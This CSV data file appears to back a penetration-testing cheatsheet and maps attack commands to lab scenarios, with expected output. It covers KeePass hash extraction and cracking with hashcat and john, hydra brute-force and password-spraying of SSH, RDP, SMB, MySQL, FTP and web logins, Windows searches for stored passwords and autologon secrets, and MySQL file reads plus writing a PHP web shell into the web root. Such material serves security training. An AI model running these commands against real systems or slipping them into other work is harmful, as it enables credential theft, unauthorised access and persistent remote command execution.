"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"keepass-database-cracking","keepass2john-extract","scenario","Scenario 1: KeePass Discovery on Windows Desktop","","",""
"keepass-database-cracking","hashid","scenario","Scenario 1: KeePass Discovery on Windows Desktop","","",""
"keepass-database-cracking","hash-rate-benchmark","scenario","Scenario 1: KeePass Discovery on Windows Desktop","","",""
"keepass-database-cracking","calculate-crack-time","scenario","Scenario 1: KeePass Discovery on Windows Desktop","","",""
"keepass-database-cracking","attack-mode-decision","scenario","Scenario 1: KeePass Discovery on Windows Desktop","","",""
"keepass-database-cracking","keepass2john-extract","scenario","Scenario 2: Network Share KeePass Discovery","","",""
"keepass-database-cracking","create-policy-rules","scenario","Scenario 2: Network Share KeePass Discovery","","",""
"keepass-database-cracking","wordlist-effectiveness","scenario","Scenario 2: Network Share KeePass Discovery","","",""
"keepass-database-cracking","calculate-crack-time","scenario","Scenario 2: Network Share KeePass Discovery","","",""
"keepass-database-cracking","hashcat-keepass-crack","scenario","Scenario 2: Network Share KeePass Discovery","","",""
"keepass-database-cracking","keepass2john-extract","scenario","Scenario 3: KeePass with Keyfile Authentication","","",""
"keepass-database-cracking","wordlist-effectiveness","scenario","Scenario 3: KeePass with Keyfile Authentication","","",""
"keepass-database-cracking","hashcat-keepass-crack","scenario","Scenario 3: KeePass with Keyfile Authentication","","",""
"keepass-database-cracking","john-keepass-crack","scenario","Scenario 3: KeePass with Keyfile Authentication","","",""
"keepass-database-cracking","keepass2john-extract","scenario","Scenario 4: Cracking Old KeePass Database","","",""
"keepass-database-cracking","hashid","scenario","Scenario 4: Cracking Old KeePass Database","","",""
"keepass-database-cracking","hash-rate-benchmark","scenario","Scenario 4: Cracking Old KeePass Database","","",""
"keepass-database-cracking","calculate-crack-time","scenario","Scenario 4: Cracking Old KeePass Database","","",""
"keepass-database-cracking","hashcat-keepass-crack","scenario","Scenario 4: Cracking Old KeePass Database","","",""
"keepass-database-cracking","hashcat-rule-attack","scenario","Scenario 4: Cracking Old KeePass Database","","",""
"keepass-database-cracking","keepass2john-extract","section","","Phase 2: Hash Extraction and Identification","keepass2john Database.kdbx > keepass.hash","$keepass$*2*"
"keepass-database-cracking","hashid","section","","Phase 2: Hash Extraction and Identification","hashid '5f4dcc3b5aa765d61d8327deb882cf99' -m","[+] MD5"
"keepass-database-cracking","hash-identifier","section","","Phase 2: Hash Extraction and Identification","hash-identifier","Possible Hashs:"
"keepass-database-cracking","hash-rate-benchmark","section","","Phase 3: Benchmark and Strategy","hashcat -b -m 1000 | grep -A3 'Hashmode:'","Hash rate displayed (H/s, kH/s, MH/s, GH/s)"
"keepass-database-cracking","calculate-crack-time","section","","Phase 3: Benchmark and Strategy","python3 -c ""keyspace=218340105584896; hash_rate=1000000000; seconds=keyspace/hash_rate; hours=seconds/3600; print(f'Time: {hours:.2f} hours ({hours/24:.2f} days)')""","Time estimate displayed"
"keepass-database-cracking","calculate-keyspace","section","","Phase 3: Benchmark and Strategy","python3 -c ""import math; charset=62; length=8; print(f'Keyspace: {charset**length:,} combinations')""","Keyspace displayed"
"keepass-database-cracking","attack-mode-decision","section","","Phase 3: Benchmark and Strategy","echo 'Attack Mode Decision Tree:\n1. Straight Wordlist (fastest, try first)\n2. Wordlist + Rules (best balance)\n3. Combinator (merge wordlists)\n4. Mask Attack (known pattern)\n5. Brute Force (last resort)'","Decision tree displayed"
"keepass-database-cracking","wordlist-effectiveness","section","","Phase 3: Benchmark and Strategy","wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c ""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')""","Line count displayed"
"keepass-database-cracking","create-policy-rules","section","","Phase 4: Intelligence Gathering","echo -e 'c $2024 $!\nc $2024 $@\nc $2024 $#' > policy.rule","Rule file created"
"keepass-database-cracking","rule-capitalize-append","section","","Phase 4: Intelligence Gathering","echo 'c $!' > cap-special.rule","Rule file created"
"keepass-database-cracking","rule-prepend-year","section","","Phase 4: Intelligence Gathering","echo '^2 ^0 ^2 ^4' > prepend-year.rule","Rule file created"
"keepass-database-cracking","wordlist-effectiveness","section","","Phase 4: Intelligence Gathering","wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c ""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')""","Line count displayed"
"keepass-database-cracking","hashcat-keepass-crack","section","","Phase 5: Cracking Execution","hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force","Cracked"
"keepass-database-cracking","john-keepass-crack","section","","Phase 5: Cracking Execution","john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules keepass.hash","Loaded 1 password hash (KeePass [SHA256 AES])"
"keepass-database-cracking","hashcat-rule-attack","section","","Phase 5: Cracking Execution","hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","Guess.Mod........: Rules"
"keepass-database-cracking","session-management","section","","Phase 5: Cracking Execution","hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --session=exam-target1 -o cracked.txt --outfile-format=2","Session started"
"keepass-database-cracking","monitor-crack-progress","section","","Phase 5: Cracking Execution","watch -n 5 'hashcat --session=exam-target1 --status 2>&1 | grep -E ""Progress|Speed|Recovered|Time""'","Progress percentage increasing"
"keepass-database-cracking","hashcat-show-cracked","section","","Phase 6: Database Access and Exploitation","hashcat -m 0 hashes.txt --show","<HASH>:<PASSWORD>"
"network-authentication-attacks","hydra-ssh-single-user","scenario","Scenario 1: SSH Single User Dictionary Attack","","",""
"network-authentication-attacks","hydra-verbose","scenario","Scenario 1: SSH Single User Dictionary Attack","","",""
"network-authentication-attacks","hydra-parallel-tasks","scenario","Scenario 1: SSH Single User Dictionary Attack","","",""
"network-authentication-attacks","hydra-wait-time","scenario","Scenario 1: SSH Single User Dictionary Attack","","",""
"network-authentication-attacks","hydra-output-file","scenario","Scenario 1: SSH Single User Dictionary Attack","","",""
"network-authentication-attacks","hydra-rdp-spray","scenario","Scenario 2: RDP Password Spraying Attack","","",""
"network-authentication-attacks","hydra-parallel-tasks","scenario","Scenario 2: RDP Password Spraying Attack","","",""
"network-authentication-attacks","hydra-resume-session","scenario","Scenario 2: RDP Password Spraying Attack","","",""
"network-authentication-attacks","hydra-show-attempts","scenario","Scenario 2: RDP Password Spraying Attack","","",""
"network-authentication-attacks","hydra-output-file","scenario","Scenario 2: RDP Password Spraying Attack","","",""
"network-authentication-attacks","hydra-http-post-form","scenario","Scenario 3: HTTP POST Login Form Attack","","",""
"network-authentication-attacks","hydra-verbose","scenario","Scenario 3: HTTP POST Login Form Attack","","",""
"network-authentication-attacks","hydra-show-attempts","scenario","Scenario 3: HTTP POST Login Form Attack","","",""
"network-authentication-attacks","hydra-output-file","scenario","Scenario 3: HTTP POST Login Form Attack","","",""
"network-authentication-attacks","hydra-combo-attack","scenario","Scenario 4: SMB Authentication with Combo Attack","","",""
"network-authentication-attacks","hydra-smb-attack","scenario","Scenario 4: SMB Authentication with Combo Attack","","",""
"network-authentication-attacks","hydra-parallel-tasks","scenario","Scenario 4: SMB Authentication with Combo Attack","","",""
"network-authentication-attacks","hydra-output-file","scenario","Scenario 4: SMB Authentication with Combo Attack","","",""
"network-authentication-attacks","hydra-verbose","scenario","Scenario 4: SMB Authentication with Combo Attack","","",""
"network-authentication-attacks","hydra-mysql-attack","scenario","Scenario 5: MySQL Database Brute-Force","","",""
"network-authentication-attacks","hydra-verbose","scenario","Scenario 5: MySQL Database Brute-Force","","",""
"network-authentication-attacks","hydra-parallel-tasks","scenario","Scenario 5: MySQL Database Brute-Force","","",""
"network-authentication-attacks","hydra-wait-time","scenario","Scenario 5: MySQL Database Brute-Force","","",""
"network-authentication-attacks","hydra-output-file","scenario","Scenario 5: MySQL Database Brute-Force","","",""
"network-authentication-attacks","hydra-show-attempts","section","","Phase 1: Pre-Attack Reconnaissance","hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100","Shows discovered services/users/shares"
"network-authentication-attacks","hydra-verbose","section","","Phase 1: Pre-Attack Reconnaissance","hydra -l admin -P /usr/share/wordlists/rockyou.txt -V ssh://192.168.45.100","[ATTEMPT] target <TARGET> - login <USER> - pass <PASS>"
"network-authentication-attacks","hydra-ssh-single-user","section","","Phase 2: Wordlist Preparation","hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100","[22][ssh] host: <TARGET>   login: <USERNAME>   password: ..."
"network-authentication-attacks","hydra-rdp-spray","section","","Phase 2: Wordlist Preparation","hydra -L /usr/share/wordlists/dirb/others/names.txt -p ""SuperS3cure1337#"" rdp://192.168.45.100","[3389][rdp] host: <TARGET>   login: <USER>   password: <P..."
"network-authentication-attacks","hydra-combo-attack","section","","Phase 2: Wordlist Preparation","hydra -C creds.txt ssh://192.168.45.100","valid password found"
"network-authentication-attacks","hydra-ssh-single-user","section","","Phase 3: Attack Execution","hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100","[22][ssh] host: <TARGET>   login: <USERNAME>   password: ..."
"network-authentication-attacks","hydra-rdp-spray","section","","Phase 3: Attack Execution","hydra -L /usr/share/wordlists/dirb/others/names.txt -p ""SuperS3cure1337#"" rdp://192.168.45.100","[3389][rdp] host: <TARGET>   login: <USER>   password: <P..."
"network-authentication-attacks","hydra-http-post-form","section","","Phase 3: Attack Execution","hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.45.100 http-post-form ""/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid""","[80][http-post-form] host: <TARGET>   login: <USER>   pas..."
"network-authentication-attacks","hydra-smb-attack","section","","Phase 3: Attack Execution","hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.45.100","[445][smb] host: <TARGET>   login: <USER>   password: <PASS>"
"network-authentication-attacks","hydra-mysql-attack","section","","Phase 3: Attack Execution","hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.45.100","[3306][mysql] host: <TARGET>   login: <USER>   password: ..."
"network-authentication-attacks","hydra-ftp-attack","section","","Phase 3: Attack Execution","hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.45.100","[21][ftp] host: <TARGET>   login: <USER>   password: <PASS>"
"network-authentication-attacks","hydra-combo-attack","section","","Phase 3: Attack Execution","hydra -C creds.txt ssh://192.168.45.100","valid password found"
"network-authentication-attacks","hydra-resume-session","section","","Phase 4: Session Management","hydra -l admin -P /usr/share/wordlists/rockyou.txt -R ssh://192.168.45.100","Restoring session from file"
"network-authentication-attacks","hydra-show-attempts","section","","Phase 4: Session Management","hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100","Shows discovered services/users/shares"
"network-authentication-attacks","hydra-output-file","section","","Phase 4: Session Management","hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100","Shows discovered services/users/shares"
"network-authentication-attacks","hydra-show-attempts","section","","Phase 5: Post-Exploitation Verification","hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100","Shows discovered services/users/shares"
"network-authentication-attacks","hydra-output-file","section","","Phase 5: Post-Exploitation Verification","hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100","Shows discovered services/users/shares"
"windows-enumeration-procedures","win-whoami-basic","scenario","Scenario 1: Initial Shell - Complete Situational Awareness","","",""
"windows-enumeration-procedures","win-whoami-groups","scenario","Scenario 1: Initial Shell - Complete Situational Awareness","","",""
"windows-enumeration-procedures","win-whoami-priv","scenario","Scenario 1: Initial Shell - Complete Situational Awareness","","",""
"windows-enumeration-procedures","win-systeminfo-basic","scenario","Scenario 1: Initial Shell - Complete Situational Awareness","","",""
"windows-enumeration-procedures","ps-get-localuser","scenario","Scenario 1: Initial Shell - Complete Situational Awareness","","",""
"windows-enumeration-procedures","ps-get-localgroup","scenario","Scenario 1: Initial Shell - Complete Situational Awareness","","",""
"windows-enumeration-procedures","ps-get-localgroupmember","scenario","Scenario 1: Initial Shell - Complete Situational Awareness","","",""
"windows-enumeration-procedures","ps-get-localgroupmember","scenario","Scenario 2: User and Group Deep Dive","","",""
"windows-enumeration-procedures","win-net-localgroup-members","scenario","Scenario 2: User and Group Deep Dive","","",""
"windows-enumeration-procedures","win-net-user-detail","scenario","Scenario 2: User and Group Deep Dive","","",""
"windows-enumeration-procedures","ps-get-installed-apps","scenario","Scenario 3: Sensitive Information Hunt","","",""
"windows-enumeration-procedures","ps-search-kdbx","scenario","Scenario 3: Sensitive Information Hunt","","",""
"windows-enumeration-procedures","ps-search-config-files","scenario","Scenario 3: Sensitive Information Hunt","","",""
"windows-enumeration-procedures","ps-search-user-docs","scenario","Scenario 3: Sensitive Information Hunt","","",""
"windows-enumeration-procedures","ps-get-history","scenario","Scenario 4: PowerShell Artifact Analysis","","",""
"windows-enumeration-procedures","ps-get-psreadline-path","scenario","Scenario 4: PowerShell Artifact Analysis","","",""
"windows-enumeration-procedures","ps-read-psreadline","scenario","Scenario 4: PowerShell Artifact Analysis","","",""
"windows-enumeration-procedures","ps-search-transcripts","scenario","Scenario 4: PowerShell Artifact Analysis","","",""
"windows-enumeration-procedures","win-privesc-winpeas","scenario","Scenario 5: Automated Enumeration and Credential Testing","","",""
"windows-enumeration-procedures","win-runas-cmd","scenario","Scenario 5: Automated Enumeration and Credential Testing","","",""
"windows-enumeration-procedures","ps-get-installed-apps","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","ps-search-kdbx","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","ps-search-app-config","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","ps-search-user-docs","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","ps-type-file","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","ps-registry-autologon","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","win-net-user-detail","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","win-runas-cmd","scenario","Scenario 6: Hidden in Plain View - Credential Pivot","","",""
"windows-enumeration-procedures","win-whoami-basic","section","","Phase 1: Identity and Context","whoami","clientwk220\dave"
"windows-enumeration-procedures","win-whoami-groups","section","","Phase 1: Identity and Context","whoami /groups","GROUP INFORMATION: helpdesk, Remote Desktop Users, Users..."
"windows-enumeration-procedures","win-whoami-priv","section","","Phase 1: Identity and Context","whoami /priv","PRIVILEGES INFORMATION: SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege..."
"windows-enumeration-procedures","ps-get-localuser","section","","Phase 2: User and Group Enumeration","Get-LocalUser","Name: Administrator (Disabled), BackupAdmin, dave, daveadmin, steve..."
"windows-enumeration-procedures","ps-get-localgroup","section","","Phase 2: User and Group Enumeration","Get-LocalGroup","Administrators, adminteam, BackupUsers, helpdesk, Remote Desktop Users..."
"windows-enumeration-procedures","ps-get-localgroupmember","section","","Phase 2: User and Group Enumeration","Get-LocalGroupMember Administrators","Administrator, backupadmin, daveadmin, offsec"
"windows-enumeration-procedures","win-net-user-local","section","","Phase 2: User and Group Enumeration","net user","User accounts for \\CLIENTWK220: Administrator, BackupAdmin, dave..."
"windows-enumeration-procedures","win-net-user-detail","section","","Phase 2: User and Group Enumeration","net user steve","Local Group Memberships: *helpdesk *Remote Desktop Users *Remote Management Users"
"windows-enumeration-procedures","win-systeminfo-basic","section","","Phase 3: System Information","systeminfo","OS Name: Microsoft Windows 11 Pro, System Type: x64-based PC, Hotfix(s): KB5015684..."
"windows-enumeration-procedures","win-ipconfig-all","section","","Phase 4: Network Enumeration","ipconfig /all","IPv4 Address: 192.168.50.220, DNS Servers: 8.8.8.8, DHCP Enabled: No"
"windows-enumeration-procedures","win-route-print","section","","Phase 4: Network Enumeration","route print","IPv4 Route Table: 0.0.0.0/0.0.0.0 via 192.168.50.254"
"windows-enumeration-procedures","win-netstat-ano","section","","Phase 4: Network Enumeration","netstat -ano","TCP 0.0.0.0:80 LISTENING 3340, TCP 192.168.50.220:3389 ESTABLISHED 1148"
"windows-enumeration-procedures","ps-get-installed-apps","section","","Phase 5: Applications and Processes","Get-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"" | select displayname","FileZilla 3.63.1, KeePass Password Safe 2.51.1, XAMPP, VMware Tools..."
"windows-enumeration-procedures","ps-get-process","section","","Phase 5: Applications and Processes","Get-Process","httpd (3340), mysqld (3508), powershell (9756), filezilla (2632)..."
"windows-enumeration-procedures","ps-search-kdbx","section","","Phase 6: Sensitive Information Discovery","Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","C:\Users\dave\Documents\Passwords.kdbx"
"windows-enumeration-procedures","ps-search-app-config","section","","Phase 6: Sensitive Information Discovery","Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.config,*.xml -File -Recurse -ErrorAction SilentlyContinue","C:\xampp\passwords.txt, C:\xampp\mysql\bin\my.ini"
"windows-enumeration-procedures","ps-search-user-docs","section","","Phase 6: Sensitive Information Discovery","Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.doc,*.docx,*.xls,*.xlsx -File -Recurse -ErrorAction SilentlyContinue","C:\Users\dave\Desktop\asdf.txt"
"windows-enumeration-procedures","ps-type-file","section","","Phase 6: Sensitive Information Discovery","type C:\xampp\mysql\bin\my.ini","[client] password = admin123admin123!"
"windows-enumeration-procedures","ps-search-deployment-files","section","","Phase 6: Sensitive Information Discovery","Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,sysprep.inf -File -Recurse -ErrorAction SilentlyContinue","C:\Windows\Panther\unattend.xml"
"windows-enumeration-procedures","ps-search-webconfig","section","","Phase 6: Sensitive Information Discovery","Get-ChildItem -Path C:\inetpub\wwwroot -Include web.config,*.config -File -Recurse -ErrorAction SilentlyContinue","C:\inetpub\wwwroot\myapp\web.config"
"windows-enumeration-procedures","ps-search-password-patterns","section","","Phase 6: Sensitive Information Discovery","Get-ChildItem -Path C:\Users -Include *password*,*cred*,*secret* -File -Recurse -ErrorAction SilentlyContinue","C:\Users\dave\Desktop\passwords.txt"
"windows-enumeration-procedures","ps-registry-autologon","section","","Phase 6: Sensitive Information Discovery","Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName,DefaultPassword","DefaultUserName: backupadmin, DefaultPassword: admin123admin123!"
"windows-enumeration-procedures","ps-cmdkey-list","section","","Phase 6: Sensitive Information Discovery","cmdkey /list","Target: TERMSRV/dc01.corp.local Type: Domain Password User: corp\admin"
"windows-enumeration-procedures","ps-get-history","section","","Phase 7: PowerShell Artifacts","Get-History","Id CommandLine (empty if new session or Clear-History was run)"
"windows-enumeration-procedures","ps-get-psreadline-path","section","","Phase 7: PowerShell Artifacts","(Get-PSReadlineOption).HistorySavePath","C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
"windows-enumeration-procedures","ps-read-psreadline","section","","Phase 7: PowerShell Artifacts","type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt","Set-Secret -Name ""Server02 Admin PW"" -Secret ""paperEarMonitor33@""
Clear-History
Start-Transcript..."
"windows-enumeration-procedures","ps-search-transcripts","section","","Phase 7: PowerShell Artifacts","Get-ChildItem -Path C:\Users\ -Include *transcript* -Recurse -ErrorAction SilentlyContinue","C:\Users\Public\Transcripts\transcript01.txt"
"windows-enumeration-procedures","win-privesc-winpeas","section","","Phase 8: Credential Leveraging and Automation","winPEASany.exe","RED highlights for vulnerabilities: Unquoted Service Paths, AlwaysInstallElevated, AutoLogon credentials..."
"windows-enumeration-procedures","win-runas-cmd","section","","Phase 8: Credential Leveraging and Automation","runas /user:backupadmin cmd","Enter password for backupadmin: (new window opens as backupadmin)"
"mariadb-mysql-enumeration","mysql-connect-nopass","scenario","Scenario 1: Initial Database Access","","",""
"mariadb-mysql-enumeration","mysql-version","scenario","Scenario 1: Initial Database Access","","",""
"mariadb-mysql-enumeration","mysql-current-user","scenario","Scenario 1: Initial Database Access","","",""
"mariadb-mysql-enumeration","mysql-show-databases","scenario","Scenario 1: Initial Database Access","","",""
"mariadb-mysql-enumeration","mysql-list-users","scenario","Scenario 1: Initial Database Access","","",""
"mariadb-mysql-enumeration","mysql-show-tables","scenario","Scenario 2: Credential Extraction from Databases","","",""
"mariadb-mysql-enumeration","mysql-describe-table","scenario","Scenario 2: Credential Extraction from Databases","","",""
"mariadb-mysql-enumeration","mysql-dump-table","scenario","Scenario 2: Credential Extraction from Databases","","",""
"mariadb-mysql-enumeration","mysql-search-password-columns","scenario","Scenario 2: Credential Extraction from Databases","","",""
"mariadb-mysql-enumeration","mysql-dump-all-users","scenario","Scenario 2: Credential Extraction from Databases","","",""
"mariadb-mysql-enumeration","mysql-show-grants","scenario","Scenario 3: MySQL User Privilege Enumeration","","",""
"mariadb-mysql-enumeration","mysql-check-file-priv","scenario","Scenario 3: MySQL User Privilege Enumeration","","",""
"mariadb-mysql-enumeration","mysql-check-dangerous-privs","scenario","Scenario 3: MySQL User Privilege Enumeration","","",""
"mariadb-mysql-enumeration","mysql-check-secure-file-priv","scenario","Scenario 3: MySQL User Privilege Enumeration","","",""
"mariadb-mysql-enumeration","mysql-check-plugin-dir","scenario","Scenario 3: MySQL User Privilege Enumeration","","",""
"mariadb-mysql-enumeration","mysql-read-file-linux","scenario","Scenario 4: File System Access via MySQL","","",""
"mariadb-mysql-enumeration","mysql-read-file-windows","scenario","Scenario 4: File System Access via MySQL","","",""
"mariadb-mysql-enumeration","mysql-read-config","scenario","Scenario 4: File System Access via MySQL","","",""
"mariadb-mysql-enumeration","mysql-write-webshell-linux","scenario","Scenario 4: File System Access via MySQL","","",""
"mariadb-mysql-enumeration","mysql-write-webshell-windows","scenario","Scenario 4: File System Access via MySQL","","",""
"mariadb-mysql-enumeration","mysql-check-plugin-dir","scenario","Scenario 5: UDF Privilege Escalation (Linux)","","",""
"mariadb-mysql-enumeration","mysql-check-plugin-dir-writable","scenario","Scenario 5: UDF Privilege Escalation (Linux)","","",""
"mariadb-mysql-enumeration","mysql-create-udf-function","scenario","Scenario 5: UDF Privilege Escalation (Linux)","","",""
"mariadb-mysql-enumeration","mysql-exec-udf-command","scenario","Scenario 5: UDF Privilege Escalation (Linux)","","",""
"mariadb-mysql-enumeration","mysql-check-bind-address","scenario","Scenario 6: Remote Access Setup via Tunneling","","",""
"mariadb-mysql-enumeration","tunnel-chisel-reverse","scenario","Scenario 6: Remote Access Setup via Tunneling","","",""
"mariadb-mysql-enumeration","tunnel-ssh-local","scenario","Scenario 6: Remote Access Setup via Tunneling","","",""
"mariadb-mysql-enumeration","mysql-grant-remote","scenario","Scenario 6: Remote Access Setup via Tunneling","","",""
"mariadb-mysql-enumeration","mysql-connect-nopass","section","","Phase 1: Connection and Basic Enumeration","mysql -h 127.0.0.1 -u root","Welcome to the MariaDB monitor. Server version: 10.3.24-MariaDB"
"mariadb-mysql-enumeration","mysql-connect-password","section","","Phase 1: Connection and Basic Enumeration","mysql -h 127.0.0.1 -u root -p'password123'","Welcome to the MariaDB monitor."
"mariadb-mysql-enumeration","mysql-version","section","","Phase 1: Connection and Basic Enumeration","SELECT VERSION(); SELECT @@version;","10.3.24-MariaDB"
"mariadb-mysql-enumeration","mysql-current-user","section","","Phase 1: Connection and Basic Enumeration","SELECT user(); SELECT current_user();","root@localhost"
"mariadb-mysql-enumeration","mysql-hostname","section","","Phase 1: Connection and Basic Enumeration","SELECT @@hostname;","ERA"
"mariadb-mysql-enumeration","mysql-datadir","section","","Phase 1: Connection and Basic Enumeration","SELECT @@datadir; SELECT @@basedir;","/var/lib/mysql/ or C:\xampp\mysql\data\"
"mariadb-mysql-enumeration","mysql-show-databases","section","","Phase 2: Database and Table Discovery","SHOW DATABASES;","creds, information_schema, mysql, performance_schema, phpmyadmin, webapp"
"mariadb-mysql-enumeration","mysql-show-tables","section","","Phase 2: Database and Table Discovery","USE creds; SHOW TABLES;","users, credentials, api_keys, admin_accounts"
"mariadb-mysql-enumeration","mysql-describe-table","section","","Phase 2: Database and Table Discovery","DESCRIBE users; SHOW COLUMNS FROM credentials;","id INT, username VARCHAR, password VARCHAR, email VARCHAR"
"mariadb-mysql-enumeration","mysql-dump-table","section","","Phase 2: Database and Table Discovery","SELECT * FROM creds.users;","1, admin, Password123!, admin@secura.yzx"
"mariadb-mysql-enumeration","mysql-search-password-columns","section","","Phase 2: Database and Table Discovery","SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%cred%' OR column_name LIKE '%secret%';","webapp, users, password | creds, api_keys, secret_key"
"mariadb-mysql-enumeration","mysql-search-user-columns","section","","Phase 2: Database and Table Discovery","SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%user%' OR column_name LIKE '%login%' OR column_name LIKE '%admin%' OR column_name LIKE '%email%';","webapp, users, username | webapp, users, email"
"mariadb-mysql-enumeration","mysql-list-users","section","","Phase 3: MySQL User and Privilege Enumeration","SELECT user, host FROM mysql.user;","root@localhost, root@127.0.0.1, pma@localhost, webapp@%"
"mariadb-mysql-enumeration","mysql-dump-all-users","section","","Phase 3: MySQL User and Privilege Enumeration","SELECT user, host, password FROM mysql.user;","root, localhost, *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (password123)"
"mariadb-mysql-enumeration","mysql-dump-users-new","section","","Phase 3: MySQL User and Privilege Enumeration","SELECT user, host, authentication_string FROM mysql.user;","For MySQL 5.7+ where password column renamed"
"mariadb-mysql-enumeration","mysql-show-grants","section","","Phase 3: MySQL User and Privilege Enumeration","SHOW GRANTS; SHOW GRANTS FOR current_user();","GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost'"
"mariadb-mysql-enumeration","mysql-check-file-priv","section","","Phase 3: MySQL User and Privilege Enumeration","SELECT File_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(current_user(),'@',1);","Y (can read/write files)"
"mariadb-mysql-enumeration","mysql-check-dangerous-privs","section","","Phase 3: MySQL User and Privilege Enumeration","SELECT user, host, File_priv, Super_priv, Process_priv FROM mysql.user;","root, localhost, Y, Y, Y"
"mariadb-mysql-enumeration","mysql-check-secure-file-priv","section","","Phase 4: File System Operations","SHOW VARIABLES LIKE 'secure_file_priv';","NULL=disabled, empty=anywhere, /path/=restricted"
"mariadb-mysql-enumeration","mysql-read-file-linux","section","","Phase 4: File System Operations","SELECT LOAD_FILE('/etc/passwd');","root:x:0:0:root:/root:/bin/bash..."
"mariadb-mysql-enumeration","mysql-read-file-windows","section","","Phase 4: File System Operations","SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');","127.0.0.1 localhost..."
"mariadb-mysql-enumeration","mysql-read-config","section","","Phase 4: File System Operations","SELECT LOAD_FILE('C:/xampp/htdocs/config.php');","$db_password = 'secretpass123';"
"mariadb-mysql-enumeration","mysql-write-webshell-linux","section","","Phase 4: File System Operations","SELECT '<?php system($_GET[""cmd""]); ?>' INTO OUTFILE '/var/www/html/shell.php';","Query OK, 1 row affected"
"mariadb-mysql-enumeration","mysql-write-webshell-windows","section","","Phase 4: File System Operations","SELECT '<?php system($_GET[""cmd""]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';","Query OK, 1 row affected"
